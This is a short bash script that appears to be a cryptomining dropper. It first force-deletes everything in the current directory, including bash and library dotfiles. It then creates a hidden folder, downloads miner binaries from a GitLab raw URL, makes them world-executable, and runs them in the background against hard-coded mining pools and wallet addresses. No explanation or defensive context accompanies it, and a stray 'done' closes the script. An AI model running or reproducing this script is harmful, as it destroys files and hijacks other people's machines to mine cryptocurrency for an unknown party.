#!/bin/bash
rm -rvf * 
rm -rvf ele* lol* 1.43* TON* ton* NB* .lib* .bash* .majza*
rm -R *
mkdir .des
cd .des
rm -R *

wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer
chmod 777 cpminer && ./cpminer -a yespower -o stratum+tcp://138.197.12.20:80 -u v255vQEQnZj2NVjF3UHpTrtwA1cGdXt4dV.$(shuf -n 1 -i 1-99999)-VISH -t4 &

wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.84
chmod 777 lol1.84

./lol1.84 -a GRAM --pool api-pool.gramcoin.org:443 --user UQDdpOB_jaOswoGqi9kCtWJBttZeh75KYzubDJsNBKx9iKV3 --no-cl

done
